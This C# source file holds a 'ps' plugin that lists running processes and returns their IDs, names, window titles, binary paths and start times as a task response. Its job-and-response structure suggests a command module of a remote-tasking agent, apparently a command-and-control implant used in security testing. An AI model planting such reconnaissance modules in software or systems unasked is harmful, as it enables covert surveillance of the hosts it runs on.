using System.Diagnostics;
using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "ps";
        private IDataBroker messageManager { get; set; }

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
        }
        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            try
            {
                List<ServerProcessInfo> processes = new List<ServerProcessInfo>();

                if (OperatingSystem.IsWindows())
                {
                    DebugLog.Log($"{Name} using Windows process enumeration [{job.task.id}]");
                    processes.AddRange(ProcessHelper.GetProcessesWithParent());
                }
                else
                {
                    DebugLog.Log($"{Name} using generic process enumeration [{job.task.id}]");
                    processes.AddRange(convertProcessToServerProcess(Process.GetProcesses()));
                }

                DebugLog.Log($"{Name} found {processes.Count} processes [{job.task.id}]");
                messageManager.AddTaskResponse(new ProcessTaskResponse
                {
                    task_id = job.task.id,
                    completed = true,
                    user_output = "Finished, check process browser for output",
                    processes = processes
                });

            }
            catch (Exception e)
            {
                DebugLog.Log($"{Name} error: {e.Message} [{job.task.id}]");
                messageManager.AddTaskResponse(new ProcessTaskResponse
                {
                    task_id = job.task.id,
                    completed = true,
                    user_output = e.ToString(),
                    processes = new List<ServerProcessInfo>()
                });
            }
            DebugLog.Log($"{Name} completed [{job.task.id}]");
        }
        private IEnumerable<string> GetTargetsFromFile(byte[] b)
        {
            string allData = Misc.GetEncoding(b).GetString(b);

            return allData.Split(Environment.NewLine);
        }

        private List<ServerProcessInfo> convertProcessToServerProcess(Process[] procs)
        {
            List<ServerProcessInfo> processes = new List<ServerProcessInfo>();

            foreach (var proc in procs)
            {
                try
                {
                    processes.Add(new ServerProcessInfo()
                    {
                        process_id = proc.Id,
                        name = proc.ProcessName,
                        description = proc.MainWindowTitle,
                        bin_path = proc.MainModule.FileName,
                        start_time = new DateTimeOffset(proc.StartTime).ToUnixTimeMilliseconds(),
                    });
                }
                catch
                {
                    processes.Add(new ServerProcessInfo()
                    {
                        process_id = proc.Id,
                        name = proc.ProcessName,
                        description = proc.MainWindowTitle,
                    });
                }
            }

            return processes;
        }
    }
}
